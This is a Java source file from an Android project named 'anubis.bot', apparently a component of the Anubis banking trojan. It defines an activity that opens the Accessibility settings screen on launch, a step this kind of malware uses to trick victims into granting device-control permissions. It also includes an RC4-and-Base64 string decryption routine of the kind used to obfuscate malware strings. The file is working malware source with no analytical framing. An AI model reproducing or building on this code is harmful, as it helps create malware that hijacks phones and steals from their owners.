package anubis.bot.myapplication.Activity;

import android.content.Intent;
import android.os.Bundle;
import android.app.Activity;
import android.provider.Settings;
import android.util.Base64;

import anubis.bot.myapplication.API.ClassRC4;
import anubis.bot.myapplication.R;
import anubis.bot.myapplication.UtilsClass;

public class ActivityAccessibility extends Activity {
    public String str_decrypt(String textDE_C, String key)
    {
        UtilsClass utilsClass = new UtilsClass();
        try
        {
            byte[] data = Base64.decode(textDE_C, Base64.DEFAULT);
            textDE_C = new String(data, "UTF-8");
            byte[] detext = utilsClass.hexStringToByteArray(textDE_C);
            ClassRC4 rcd = new ClassRC4(key.getBytes());
            return  new String(rcd.decrypt(detext));
        }catch (Exception ex){ }
        return "";
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
       // setContentView(R.layout.activity_accessibility);
        try {
            startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));

        } catch (Exception ex) {
            finish();
        }
    }

}
